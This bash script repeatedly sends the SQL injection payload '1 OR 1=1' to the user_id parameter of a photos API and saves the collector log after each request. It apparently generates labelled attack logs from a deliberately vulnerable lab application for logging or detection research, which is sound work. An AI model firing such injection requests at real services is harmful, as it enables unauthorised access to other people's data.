#!/bin/bash

base_url="http://XX.X.XX.XX:XXXX/api/photos"

log_file="/home/$hostname/Work/Pluggable_Logging/Collector_logs/Vulnerable_Photo_App/PhotoService/Attack/2024-09-25_14-45-37.txt"

i=1

move_and_truncate_log() {
    new_log_file="/home/$hostname/Work/vulnerable-photo-app/logs/PhotoService/Attack2/photos_sqlinjection_attack_${i}.log"
    cat "$log_file" > "$new_log_file" && truncate -s 0 "$log_file"
    echo "Log content moved to $new_log_file and source log file truncated."
}

for (( i=1; i<=100; i++ ))
do
    user_id="1 OR 1=1"

    encoded_user_id=$(printf "%s" "$user_id" | jq -sRr @uri)
    request_url="${base_url}?user_id=${encoded_user_id}"

    response=$(curl -X GET "$request_url")
    sleep 3
    move_and_truncate_log
    sleep 3
done